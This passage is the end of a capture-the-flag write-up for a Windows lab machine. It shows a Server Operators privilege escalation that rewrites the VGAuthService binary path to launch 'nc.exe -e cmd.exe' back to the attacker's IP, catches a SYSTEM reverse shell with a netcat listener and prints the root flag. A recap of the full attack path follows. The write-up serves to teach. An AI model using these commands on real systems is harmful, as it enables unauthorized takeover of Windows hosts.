<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>upload<span class="w"> </span>/home/ch3ckm8/Downloads/nc.exe
</span></code></pre></div></p>
<ol>
<li>modify the binary path, to point to netcat, and then tell netcat to connect to your machine’s ip<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>sc<span class="w"> </span>config<span class="w"> </span>VGAuthService<span class="w"> </span><span class="nv">binPath</span><span class="o">=</span><span class="s2">&quot;C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.3 443&quot;</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>sc<span class="w"> </span>stop<span class="w"> </span>VGAuthService
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>sc<span class="w"> </span>start<span class="w"> </span>VGAuthService
</span></code></pre></div></li>
</ol>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt;<span class="w"> </span>sc.exe<span class="w"> </span>config<span class="w"> </span>VGAuthService<span class="w"> </span><span class="nv">binPath</span><span class="o">=</span><span class="s2">&quot;C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.3 443&quot;</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="o">[</span>SC<span class="o">]</span><span class="w"> </span>ChangeServiceConfig<span class="w"> </span>SUCCESS
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt;<span class="w"> </span>sc.exe<span class="w"> </span>stop<span class="w"> </span>VGAuthService
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>
</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>SERVICE_NAME:<span class="w"> </span>VGAuthService
</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="w">        </span>TYPE<span class="w">               </span>:<span class="w"> </span><span class="m">10</span><span class="w">  </span>WIN32_OWN_PROCESS
</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="w">        </span>STATE<span class="w">              </span>:<span class="w"> </span><span class="m">1</span><span class="w">  </span>STOPPED
</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a><span class="w">        </span>WIN32_EXIT_CODE<span class="w">    </span>:<span class="w"> </span><span class="m">0</span><span class="w">  </span><span class="o">(</span>0x0<span class="o">)</span>
</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a><span class="w">        </span>SERVICE_EXIT_CODE<span class="w">  </span>:<span class="w"> </span><span class="m">0</span><span class="w">  </span><span class="o">(</span>0x0<span class="o">)</span>
</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a><span class="w">        </span>CHECKPOINT<span class="w">         </span>:<span class="w"> </span>0x0
</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a><span class="w">        </span>WAIT_HINT<span class="w">          </span>:<span class="w"> </span>0x0
</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc-printer<span class="se">\D</span>ocuments&gt;<span class="w"> </span>sc.exe<span class="w"> </span>start<span class="w"> </span>VGAuthService
</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a><span class="o">[</span>SC<span class="o">]</span><span class="w"> </span>StartService<span class="w"> </span>FAILED<span class="w"> </span><span class="m">1053</span>:
</span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a>
</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a>The<span class="w"> </span>service<span class="w"> </span>did<span class="w"> </span>not<span class="w"> </span>respond<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>start<span class="w"> </span>or<span class="w"> </span>control<span class="w"> </span>request<span class="w"> </span><span class="k">in</span><span class="w"> </span>a<span class="w"> </span>timely<span class="w"> </span>fashion.
</span></code></pre></div><br />
Don’t worry about this error “The service did not respond to the start or control request in a timely fashion.” , it is expected</p>
<ol>
<li>Start the listener:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="w"> </span>rlwrap<span class="w"> </span>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">443</span>
</span></code></pre></div></li>
</ol>
<p>aand got shell!<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">443</span><span class="w"> </span>...
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.3<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.129.165.43<span class="o">]</span><span class="w"> </span><span class="m">52938</span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Version<span class="w"> </span><span class="m">10</span>.0.17763.107<span class="o">]</span>
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2018</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>All<span class="w"> </span>rights<span class="w"> </span>reserved.
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>whoami
</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>nt<span class="w"> </span>authority<span class="se">\s</span>ystem
</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>
</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
</span></code></pre></div><br />
grabbed root flag <code>e615c5a829daf39951c4fe7b797736fa</code></p>
<p>proof<br />
<img alt="" src="../MediaFiles/image%2011%201.png" /></p>
<hr />
<h1 id="summary">Summary</h1>
<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>
<h4 id="reconnaissance_1">Reconnaissance</h4>
<ol>
<li>nmap <code>scan</code> -&gt; https stands out, tried this one first</li>
<li>inspected the <code>web app</code> which appeared to be related with some printer service, and by using BurpSuite found that one page (settings) only sends the <code>ip</code> address from the form, while also containing valuable information such as a valid username (svc-printer)</li>
</ol>
<h4 id="foothold_1">Foothold</h4>
<ol>
<li>since it only sends the ip that the user specifies on the form, i tried typing my hosts ip and successfully grabbed <code>rev shell</code>, which also gave out a plaintext password!</li>
<li><code>correlated</code> the found user's  creds with the <code>win-rm</code> and <code>ldap</code> service</li>
<li><strong>logged in</strong> via evil-winrm to host using on user <strong>svc-alfresco</strong>, and grabbed the <mark>user flag</mark>.</li>
</ol>
<h4 id="privesc_1">Privesc</h4>
<ol>
<li>enumerated <code>LDAP</code> via ldapsearch and bloodhound, found found valid users and also that the compromised user's <code>group membership</code> was among other default ones, some groups called <code>Server Operators</code> and <code>Print Operators</code> .</li>
<li>Inspected both of these groups, and i found that <code>Server Operators</code> have some interesting privileges that allow to backup/restore specific files and even <code>modify services</code></li>
<li>Then i <code>listed services</code> and found one service (VGAuthService) to be vulnerable to a cve, for which i found commands that exploit it via modifying the service's binary and replacing it with a binary of our preference, which in that case was netcat exe (nc.exe) in order to get a shell back on our machine</li>
<li>after restarting the service, <code>netcat</code> connected to our machine, <code>got shell</code> as administrator and grab the <mark>root flag</mark></li>
</ol>
<hr />
<h1 id="sidenotes">Sidenotes</h1>
<p>This was an interesting machine, lesson learned from this one was to thoroughly analyze and identify user group membership’s privileges. Though bloodhound usage at first showed the overall privesc path , smaller details had to be found by analyzing and investigating what the groups are allowed to do in terms of privileges. </p>
<p><img alt="" src="../MediaFiles/image%2012%201.png" /></p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs", "search.highlight", "toc.sticky", "toc.follow", "content.code.copy", "navigation.top", "navigation.external"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
      
        <script src="../assets/javascripts/interactive_graph.js"></script>
      
        <script src="../assets/javascripts/obsidian_tags.js"></script>
      
    
  </body>
</html>